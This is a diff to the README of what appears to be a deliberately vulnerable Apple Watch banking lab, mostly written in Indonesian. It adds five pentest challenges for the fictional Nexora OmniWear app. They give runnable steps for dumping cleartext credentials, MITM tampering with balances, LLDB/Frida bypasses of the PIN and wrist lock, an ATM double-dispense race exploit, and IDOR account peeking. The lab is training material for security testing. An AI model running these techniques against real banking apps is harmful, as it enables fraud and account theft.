@@ -21,8 +21,14 @@
    - [Scenario 9: Emergency Wrist Card Kill-Switch Desynchronization (V-W09)](#scenario-9-emergency-wrist-card-kill-switch-desynchronization-v-w09)
    - [Scenario 10: Client-Side iOS Jailbreak Anti-Tamper Detection Bypass (V-07)](#scenario-10-client-side-ios-jailbreak-anti-tamper-detection-bypass-v-07)
    - [Scenario 11: CISO Governance & Audit Compliance Assessment (POJK 11 / PCI-DSS v4.0)](#scenario-11-ciso-governance--audit-compliance-assessment-pojk-11--pci-dss-v40)
-6. [Frida & Cycript Cheatsheet for iOS & watchOS](#6-frida--cycript-cheatsheet-for-ios--watchos)
-7. [Regulatory Compliance Matrix & Enterprise Remediation](#7-regulatory-compliance-matrix--enterprise-remediation)
+6. [Panduan Pentest Standalone watchOS + Mac (Tanpa Companion iPhone)](#6-panduan-pentest-standalone-watchos--mac-tanpa-companion-iphone)
+   - [Standalone Challenge 1: Forensic Sandbox Plist & Cache Dump via simctl (Pillar 1)](#standalone-challenge-1-forensic-sandbox-plist--cache-dump-via-simctl-pillar-1)
+   - [Standalone Challenge 2: Direct Cleartext Wi-Fi HTTP MITM & Reversal via Burp Suite (Pillar 2)](#standalone-challenge-2-direct-cleartext-wi-fi-http-mitm--reversal-via-burp-suite-pillar-2)
+   - [Standalone Challenge 3: Standalone Runtime Memory Swizzling via LLDB & Frida (Pillar 3)](#standalone-challenge-3-standalone-runtime-memory-swizzling-via-lldb--frida-pillar-3)
+   - [Standalone Challenge 4: Standalone ATM Double-Dispense Race Condition via Python Multi-threading (Pillar 4)](#standalone-challenge-4-standalone-atm-double-dispense-race-condition-via-python-multi-threading-pillar-4)
+   - [Standalone Challenge 5: Standalone Wrist BOLA / IDOR Account Peeking via Deep Link & Direct API (Pillar 4)](#standalone-challenge-5-standalone-wrist-bola--idor-account-peeking-via-deep-link--direct-api-pillar-4)
+7. [Frida & Cycript Cheatsheet for iOS & watchOS](#7-frida--cycript-cheatsheet-for-ios--watchos)
+8. [Regulatory Compliance Matrix & Enterprise Remediation](#8-regulatory-compliance-matrix--enterprise-remediation)
 
 ---
 
@@ -941,7 +947,204 @@ Nexora Watch replicates a premier private digital banking workflow:
 
 ---
 
-## 🛠️ 6. Frida & Cycript Cheatsheet for iOS & watchOS
+## ⌚ 6. Panduan Pentest Standalone watchOS + Mac (Tanpa Companion iPhone)
+
+Bab khusus ini dirancang khusus bagi penetration tester dan security researcher yang melakukan pengujian keamanan smartwatch **secara mandiri (standalone)** hanya menggunakan **Apple Watch (Simulator atau Hardware Fisik)** dan **Laptop Mac/MacBook penguji**, **100% tanpa memerlukan aplikasi companion iPhone**.
+
+Klien Apple Watch Nexora OmniWear (`com.nexorabank.omniwear.watchkitapp`) memiliki arsitektur dual-mode: selain mampu berkomunikasi via Bluetooth LE (`WCSession`), jam tangan ini juga memiliki antarmuka jaringan HTTP mandiri (`WatchNetworkManager.swift`), media penyimpanan sandboxed lokal (`InsecureStorage.swift`), registrasi Custom URL Scheme (`nexorabank://`), serta modul runtime Objective-C dinamis yang dapat diakses langsung oleh toolchain riset pada macOS (Xcode `simctl`, LLDB debugger, Frida, Burp Suite, dan Python multi-threading).
+
+---
+
+### Standalone Challenge 1: Forensic Sandbox Plist & Cache Dump via simctl (Pillar 1)
+- **Vulnerability Code**: `V-AP01` & `V-AP01b`
+- **Klasifikasi Kelemahan**: CWE-312 (Cleartext Storage of Sensitive Information), OWASP MASVS-STORAGE-1
+- **Target Pentest**: Direktori sandboxed container watchOS:
+  - `Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist`
+  - `Library/Caches/com.nexorabank.omniwear.watchkitapp/Cache.db`
+- **Konsep Serangan**:
+  Aplikasi watchOS menyimpan token otentikasi JWT, Quick-PIN 4-digit nasabah, nomor rekening primer (`NX-8492014`), dan saldo rupiah secara tidak terenkripsi ke dalam `UserDefaults.standard`. Selain itu, respon HTTP dari server perbankan di-cache ke dalam database SQLite internal `Cache.db`. Peneliti di laptop Mac dapat mengekstraksi seluruh kredensial ini menggunakan utilitas `simctl`.
+- **Langkah-Langkah Eksploitasi (Terminal Mac)**:
+  1. Dapatkan path direktori sandboxed data aplikasi watchOS di Mac:
+     ```bash
+     CONTAINER_DIR=$(xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data)
+     echo "[+] Sandboxed Watch Container: $CONTAINER_DIR"
+     cd "$CONTAINER_DIR"
+     ```
+  2. Ekstraksi dan periksa file `.plist` preferensi lokal:
+     ```bash
+     plutil -p Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist
+     ```
+     **Output Bukti Forensik**:
+     ```json
+     {
+       "nexora_account_holder" => "Alexander Vance"
+       "nexora_account_number" => "NX-8492014"
+       "nexora_auth_token" => "eyWatchMockToken.eyJzdWIiOiJhbGV4YW5kZXIudmFuY2UiLCJhbW91bnQiOjg4ODg4ODAwMC4wfQ=="
+       "nexora_cached_balance" => 888888000.0
+       "nexora_currency" => "IDR"
+       "nexora_quick_pin" => "1234"
+     }
+     ```
+  3. Dump respon HTTP yang tersimpan di SQLite `Cache.db`:
+     ```bash
+     sqlite3 "Library/Caches/com.nexorabank.omniwear.watchkitapp/Cache.db" \
+       "SELECT request_key, receiver_data FROM cfurl_cache_receiver_data;"
+     ```
+- **Simulasi Interaktif di Jam**:
+  - Buka menu **Security Audit Lab -> P1 (Storage & Cryptography)**.
+  - Tekan **V-AP01: Standalone Plist Dump** -> Muncul pesan `[V-AP01] Standalone Plist Dump: PIN=1234, Acct=NX-8492014`.
+  - Tekan **V-AP01b: Standalone Cache.db Dump** -> Memverifikasi keberadaan database cache cleartext.
+
+---
+
+### Standalone Challenge 2: Direct Cleartext Wi-Fi HTTP MITM & Reversal via Burp Suite (Pillar 2)
+- **Vulnerability Code**: `V-B01` / Direct HTTP Relay
+- **Klasifikasi Kelemahan**: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-345 (Insufficient Verification of Data Authenticity)
+- **Target Pentest**: `WatchNetworkManager.swift` direct HTTP queries ke core backend `http://<Mac-IP>:5000`.
+- **Konsep Serangan**:
+  Karena `Info.plist` watchOS mengaktifkan `NSAllowsArbitraryLoads = true` dan Swift `URLSession` tidak menerapkan SSL/TLS certificate pinning, Apple Watch dapat langsung melakukan query HTTP tanpa enkripsi melalui koneksi Wi-Fi ke mesin penguji. Peneliti dapat mengarahkan lalu lintas jam ke Burp Suite Proxy di Mac dan memanipulasi saldo rekening maupun riwayat transaksi saat transit.
+- **Langkah-Langkah Eksploitasi (Terminal & Burp Suite Mac)**:
+  1. Jalankan Burp Suite di Mac, pastikan listener aktif di `0.0.0.0:8080`.
+  2. Arahkan koneksi jaringan watch simulator ke Burp Suite, atau atur base URL jam tangan di `InsecureStorage` mengarah ke port proxy atau backend (`http://127.0.0.1:5000`).
+  3. Lakukan interupsi (Proxy Intercept ON) untuk endpoint `/check_balance/NX-8492014`:
+     - Respon asli dari backend:
+       ```json
+       {"accountNumber":"NX-8492014","balance":888888000.0,"currency":"IDR"}
+       ```
+     - Ubah isi respon HTTP di Burp Suite menjadi:
+       ```json
+       {"accountNumber":"NX-8492014","balance":9999999999.0,"currency":"IDR"}
+       ```
+  4. Teruskan paket (Forward). Perhatikan layar Apple Watch: saldo seketika berubah menampilkan saldo palsu `Rp 9.999.999.999`.
+- **Simulasi Interaktif di Jam**:
+  - Buka **Audit Lab -> P2 (Transport & Bridge)**.
+  - Tekan **V-B01: Standalone Cleartext Wi-Fi MITM** -> Jam mengeksekusi request HTTP langsung ke Flask port 5000 dan menampilkan respon berhasil `[V-B01] Standalone HTTP OK: Rp ...`.
+
+---
+
+### Standalone Challenge 3: Standalone Runtime Memory Swizzling via LLDB & Frida (Pillar 3)
+- **Vulnerability Code**: `V-AP05` & `V-AP03`
+- **Klasifikasi Kelemahan**: CWE-693 (Protection Mechanism Failure), CWE-305 (Authentication Bypass by Primary Weakness)
+- **Target Pentest**: Target method Objective-C dinamis:
+  - `-[WristSensorManager isWristAttachedToBody]`
+  - `-[InsecureStorage verifyPin:]`
+- **Konsep Serangan**:
+  Aplikasi watchOS bergantung pada nilai pengembalian method kelas Swift/ObjC untuk mengontrol apakah jam sedang terpasang di pergelangan tangan (wrist-detect) dan apakah PIN 4-digit yang dimasukkan valid. Dengan menempelkan debugger LLDB atau Frida ke proses `NexoraWatch` di Mac, peneliti dapat men-swizzle nilai balik method tersebut secara langsung di memori RAM, sehingga jam tangan tetap terbuka (unlocked) walaupun dilepas dari pergelangan tangan, serta PIN apapun akan diterima.
+- **Langkah-Langkah Eksploitasi**:
+  1. **Metode A: Runtime Patching Menggunakan LLDB (Bawaan Xcode Mac)**:
+     ```bash
+     # Pasang LLDB ke proses jam yang sedang berjalan
+     lldb -n NexoraWatch
+     ```
+     Di dalam prompt LLDB, pasang breakpoint command untuk memaksa `isWristAttachedToBody` selalu mengembalikan nilai `1` (`true`):
+     ```lldb
+     (lldb) breakpoint set -n "-[WristSensorManager isWristAttachedToBody]"
+     (lldb) breakpoint command add 1
+     > thread return 1
+     > continue
+     > DONE
+     (lldb) c
+     ```
+     *Hasil*: Ketika smartwatch dilepaskan atau fungsi `triggerWristOff()` dipanggil, proteksi layar terkunci (`WristLockoutView`) terabaikan sepenuhnya!
+  2. **Metode B: Dynamic Instrumentation Menggunakan Frida**:
+     Jalankan script otomatis yang telah disediakan di repository:
+     ```bash
+     frida -n NexoraWatch -l scripts/frida_bypass_wrist.js
+     ```
+     Script ini secara otomatis mem-patch `-[WristSensorManager isWristAttachedToBody]` dan `-[InsecureStorage verifyPin:]`. Setiap PIN sembarang (misal `0000`) akan diverifikasi sebagai berhasil (`PASS`).
+- **Simulasi Interaktif di Jam**:
+  - Buka **Audit Lab -> P3 (Sensors & Anti-Tamper)**.
+  - Tekan **V-AP05: Standalone LLDB/Frida Wrist Hook** -> Jam mengaktifkan mode simulasi hook: status `isWristAttachedToBody=true`.
+  - Kembali ke Dashboard dan tekan **Test Wrist Lock** -> Layar tetap terbuka tanpa terkunci.
+
+---
+
+### Standalone Challenge 4: Standalone ATM Double-Dispense Race Condition via Python Multi-threading (Pillar 4)
+- **Vulnerability Code**: `V-L04`
+- **Klasifikasi Kelemahan**: CWE-362 (Race Condition / TOCTOU), CWE-307 (Improper Restriction of Excessive Authentication Attempts)
+- **Target Pentest**: Endpoint ATM Cardless Cash backend:
+  - Generate: `POST /api/atm/cardless-cash/generate`
+  - Verify/Dispense: `POST /api/atm/cardless-cash/verify`
+- **Konsep Serangan**:
+  Fitur tarik tunai tanpa kartu di ATM memungkinkan nasabah membuat kode OTP 6-digit langsung dari jam. Endpoint verifikasi memiliki jeda eksekusi non-atomik sebesar ~60 milidetik antara pembacaan token aktif (`SELECT`) dan pembaharuan status token menjadi terpakai (`UPDATE status = 'DISPENSED'`). Peneliti di Mac dapat memanfaatkan script Python multi-threading (`scripts/exploit_double_dispense.py`) untuk mengirimkan 5 hingga 8 permintaan verifikasi simultan dalam jendela TOCTOU tersebut, menyebabkan ATM mencairkan uang tunai dua kali lipat untuk satu kode penarikan.
+- **Langkah-Langkah Eksploitasi (Terminal Mac)**:
+  1. Pada Apple Watch: Masuk ke menu **Cardless Cash** dan tekan **Generate New OTP** (atau buka **Audit Lab -> P4** dan tekan **V-L04: Standalone ATM Double-Dispense Race**).
+  2. Catat kode OTP 6-digit yang muncul di layar jam (misal: `849201`).
+  3. Di Terminal Mac, jalankan script eksploitasi multi-threading:
+     ```bash
+     python scripts/exploit_double_dispense.py 849201
+     ```
+     **Output Eksekusi Exploit**:
+     ```text
+     =================================================================
+       NEXORA OMNIWEAR STANDALONE ATM RACE CONDITION EXPLOIT (V-L04)
+     =================================================================
+     [*] Target Endpoint: http://127.0.0.1:5000/api/atm/cardless-cash/verify
+     [*] Attacking with OTP Token: 849201
+     [*] Firing 5 concurrent threads within the 60ms TOCTOU window...
+
+     [+] Verification Responses:
+       Thread 1 -> HTTP 200: {'amount': 100000.0, 'status': 'DISPENSED'} ✓ [DISPENSED]
+       Thread 2 -> HTTP 200: {'amount': 100000.0, 'status': 'DISPENSED'} 🔥 [DOUBLE DISPENSE]
+       Thread 3 -> HTTP 400: {'error': 'Token already redeemed'} ✗ [REJECTED]
+       Thread 4 -> HTTP 400: {'error': 'Token already redeemed'} ✗ [REJECTED]
+       Thread 5 -> HTTP 400: {'error': 'Token already redeemed'} ✗ [REJECTED]
+
+     =================================================================
+     [!] VULNERABILITY CONFIRMED: Token was dispensed 2 times!
+     [!] ATM hardware dispensed cash twice, mutating SQLite ledger twice.
+     =================================================================
+     ```
+  4. Verifikasi mutasi ganda pada database SQLite perbankan di Mac:
+     ```bash
+     sqlite3 backend/nexora_vault.db "SELECT id, from_account, amount, description, timestamp FROM transactions WHERE description LIKE '%Cardless ATM%' ORDER BY id DESC LIMIT 2;"
+     ```
+     Tampak dua baris transaksi debit masing-masing sebesar Rp 100.000 dengan timestamp identik tercatat pada saldo nasabah.
+
+---
+
+### Standalone Challenge 5: Standalone Wrist BOLA / IDOR Account Peeking via Deep Link & Direct API (Pillar 4)
+- **Vulnerability Code**: `V-AP07` / Broken Object Level Authorization
+- **Klasifikasi Kelemahan**: CWE-639 (Authorization Bypass Through User-Controlled Key), OWASP API1:2023
+- **Target Pentest**:
+  - URL Scheme: `nexorabank://account?num=<accountNumber>`
+  - Direct HTTP Endpoint: `GET /check_balance/<accountNumber>`
+- **Konsep Serangan**:
+  Aplikasi jam mendaftarkan penangan Custom URL Scheme (`nexorabank://`) di `Info.plist` dan `ContentView.swift`. Penangan ini langsung mengeset nomor rekening aktif dan mem-bypass autentikasi Quick-PIN tanpa memvalidasi sesi kepemilikan. Di sisi backend, endpoint `/check_balance/<accountNumber>` mengembalikan saldo rekening apapun tanpa memerlukan JWT Bearer token atau validasi otorisasi. Peneliti dapat mengintip rekening nasabah VIP lain, seperti Evelyn Sterling (`NX-7391048`), langsung dari Mac ke layar Apple Watch!
+- **Langkah-Langkah Eksploitasi (Terminal Mac)**:
+  1. Trigger Deep Link BOLA dari Mac ke Apple Watch simulator:
+     ```bash
+     xcrun simctl openurl booted "nexorabank://account?num=NX-7391048"
+     ```
+  2. Amati layar jam tangan:
+     - Aplikasi langsung melompati layar kunci PIN (Quick-PIN Bypass).
+     - Menampilkan nomor rekening `NX-7391048` (Evelyn Sterling).
+     - Menampilkan saldo rekening Evelyn Sterling: `Rp 70.250.000`.
+  3. Verifikasi ketiadaan otorisasi melalui curl di Mac:
+     ```bash
+     curl -s http://127.0.0.1:5000/check_balance/NX-7391048 | jq .
+     ```
+     Respon:
+     ```json
+     {
+       "accountNumber": "NX-7391048",
+       "balance": 70250000.0,
+       "currency": "IDR"
+     }
+     ```
+  4. Coba rekening target nasabah lainnya (misal: Marcus Holloway `NX-9201482`):
+     ```bash
+     xcrun simctl openurl booted "nexorabank://account?num=NX-9201482"
+     ```
+     Layar jam tangan seketika memperbarui tampilan ke saldo Marcus Holloway (`Rp 18.750.000`).
+- **Simulasi Interaktif di Jam**:
+  - Buka **Audit Lab -> P4 (Authentication & 2FA)**.
+  - Tekan **V-AP07: Standalone BOLA (Evelyn Sterling)** -> Jam mengeksekusi query langsung ke backend dan mengonfirmasi eksposur: `[V-AP07] BOLA Expose: NX-7391048 = Rp 70.250.000`.
+  - Tekan **Reset Account to NX-8492014** untuk mengembalikan sesi ke nasabah default Alexander Vance.
+
+---
+
+## 🛠️ 7. Frida & Cycript Cheatsheet for iOS & watchOS
 
 ### WCSession Sniffer Hook Script
 ```javascript
@@ -967,7 +1170,7 @@ console.log(defaults.dictionaryRepresentation().toString());
 
 ---
 
-## 🛡️ 7. Regulatory Compliance Matrix & Enterprise Remediation
+## 🛡️ 8. Regulatory Compliance Matrix & Enterprise Remediation
 
 | Vulnerability Code | Scenario Name | Business Risk | Regulatory Violation | Production Remediation |
 |---|---|---|---|---|
